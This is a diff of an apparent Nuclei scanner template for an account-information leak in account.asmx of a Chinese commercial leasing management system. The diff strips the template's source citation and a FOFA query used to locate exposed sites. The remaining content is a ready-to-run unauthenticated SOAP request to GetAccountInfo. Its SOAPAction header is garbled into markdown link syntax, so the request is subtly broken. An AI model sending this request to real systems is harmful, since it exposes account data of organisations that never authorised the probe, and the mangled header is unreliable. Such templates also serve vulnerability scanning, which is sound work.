@@ -3,12 +3,8 @@ info:
   name: 商业租赁管理系统account.asmx信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/we84pldmv5xg8tfh'
+  description: ''
   tags: info-leak,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: we84pldmv5xg8tfh
-    fofa: title="商业租赁管理系统" || body="Silverlight/install/Silverlight5.exe" || body="pageUrl = \"/loading.aspx\"" || body="竞优软件</a>"
 http:
 - raw:
   - "POST /rental/contract/api/account.asmx HTTP/1.1\nContent-Type: text/xml; charset=utf-8\nHost: {{Hostname}}\nSOAPAction: [http://tempuri.org/GetAccountInfo](http://tempuri.org/GetAccountInfo)\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\n    xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soap:Body>\n        <GetAccountInfo xmlns=\"http://tempuri.org/\" />\n    </soap:Body>\n</soap:Envelope>"
